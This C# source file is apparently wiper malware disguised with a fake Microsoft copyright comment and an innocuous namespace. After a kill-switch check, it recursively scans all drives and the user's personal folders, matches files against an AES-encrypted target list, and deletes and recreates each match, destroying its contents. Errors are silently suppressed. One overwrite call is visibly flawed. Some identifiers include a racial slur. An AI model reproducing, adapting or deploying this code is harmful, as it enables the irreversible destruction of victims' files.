using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace ApiController
{
    /// <summary>
    /// Microsoft corp expanion all rights reserved 2008
    /// </summary>
    internal class Program
    {
        private static readonly char[] A1 = new char[] { '\\' };
        private static readonly byte[] A2 = new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 };
        private static readonly string A3 = Assembly.GetCallingAssembly().FullName;
        private static readonly IReadOnlyList<string> A4 = F3("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", A3).Replace("\r", "").Replace("\n", "").Split(',').Select(r => F2(r.Replace(" ", ""), A3)).Distinct().OrderBy(s => s).ToList();
        private static bool A5 = true;
        private static readonly int A6 = 0;

        private static readonly Environment.SpecialFolder[] CDriveShit = new Environment.SpecialFolder[] {
            Environment.SpecialFolder.MyDocuments,
            Environment.SpecialFolder.MyMusic,
            Environment.SpecialFolder.MyPictures,
            Environment.SpecialFolder.MyVideos,
            Environment.SpecialFolder.Desktop,
            Environment.SpecialFolder.CommonDocuments
        };
        private static void Main(string[] args)
        {
            F11();
            if (A5)
            {
                F4(false);
                try
                {
                    File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Evac"), DateTime.Now.ToUniversalTime().ToString()+"\n"+ DateTime.Now.ToLongTimeString().ToString());
                }
                catch { }
            }
            else
            {
                F4(true);
                if (args?.Length > 0)
                {
                    foreach (string item in args)
                    {
                        if (Directory.Exists(item))
                        {
                            F7(item);
                        }
                    }
                }
                F5();
            }
            Environment.Exit(Environment.ExitCode);
        }

        private static void F11()
        {
            System.Threading.Thread.Sleep(5000);

            A5 = F1();
        }

        private static bool F1()
        {
            try
            {
                string ass = F3("zWbcFuAHUhIWILV4uPUoJA==", A3);
                DriveInfo[] aha = DriveInfo.GetDrives(); ;
                foreach (DriveInfo item in aha)
                {
                    try
                    {
                        foreach (FileInfo file in item.RootDirectory.EnumerateFiles())
                        {
                            if (file.Name == ass)
                            {
                                return true;
                            }
                        }
                    }
                    catch { }
                }
                return false;
            }
            catch
            {
                return true;
            }
        }
        private static string F2(string hola, string yolo)
        {
            if (string.IsNullOrEmpty(hola))
            {
                return hola;
            }
            if (string.IsNullOrEmpty(yolo))
            {
                return hola;
            }
            byte[] clearBytes = Encoding.Unicode.GetBytes(hola);
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(yolo, A2);
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);

                    }
                    hola = Convert.ToBase64String(ms.ToArray());
                }
            }
            return hola;
        }
        private static string F3(string nigga, string ass)
        {
            if (string.IsNullOrEmpty(nigga))
            {
                return nigga;
            }
            if (string.IsNullOrEmpty(ass))
            {
                return nigga;
            }
            nigga = nigga.Replace(" ", "+");
            byte[] cipherBytes = Convert.FromBase64String(nigga);
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(ass, A2);
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cipherBytes, 0, cipherBytes.Length);
                    }
                    nigga = Encoding.Unicode.GetString(ms.ToArray());
                }
            }
            return nigga;
        }
        private static void F4(bool yea)
        {
            try
            {
                
            }
            catch
            { }
        }
        private static void F5()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            List<Task> tasks = new List<Task>();
            foreach (DriveInfo drive in drives)
            {
                tasks.Add(F6(drive));
            }
            Task.WaitAll(tasks.ToArray());
        }
        private static async Task F6(DriveInfo drive)
        {
            await Task.Run(() =>
          {
              try
              {
                  if (!drive.IsReady)
                  {
                      return;
                  }
                  if (drive.ToString() != @"C:\")
                  {

                      F7(drive.RootDirectory.FullName);
                  }
                  else
                  {

                      foreach (Environment.SpecialFolder item in CDriveShit)
                      {
                          try
                          {
                              F7(Environment.GetFolderPath(item));
                          }
                          catch
                          {

                          }
                      }
                      F7(drive.RootDirectory.FullName);
                  }

              }
              catch
              {

              }
          });
        }
        private static void F7(string yeet)
        {
            foreach (string item in Directory.EnumerateFiles(yeet))
            {
                try
                {
                    F8(item);
                }
                catch { }
            }
            foreach (string item in Directory.EnumerateDirectories(yeet))
            {
                try
                {
                    F7(item);
                }
                catch
                {

                }
            }
        }
        private static IReadOnlyList<string> Vs;
        private static void F8(string yeet)
        {
            try
            {
                if (A5)
                {
                    return;
                }
                if (Vs == null)
                {
                    lock (A4)
                    {
                        Vs = new List<string>(A4.Select(s => F3(s, A3)));
                    }
                }
                System.Threading.Thread.Sleep(1);
                foreach (string name in Vs)
                {
                    if (name.Equals(Path.GetFileName(yeet), StringComparison.OrdinalIgnoreCase))
                    {
                        F9(yeet);
                        break;
                    }
                }
            }
            catch { }
        }
        private static void F9(string koko)
        {
            try
            {
                long size = new FileInfo(koko).Length;
                System.IO.File.Delete(koko);
                using (FileStream st = System.IO.File.Create(koko))
                {
                    st.SetLength(size);
                    st.Write(Program.A2, 0, 1024 * 1024);
                }
            }
            catch { }
        }
        private static string F10()
        {
            return Environment.UserName;
        }
    }
}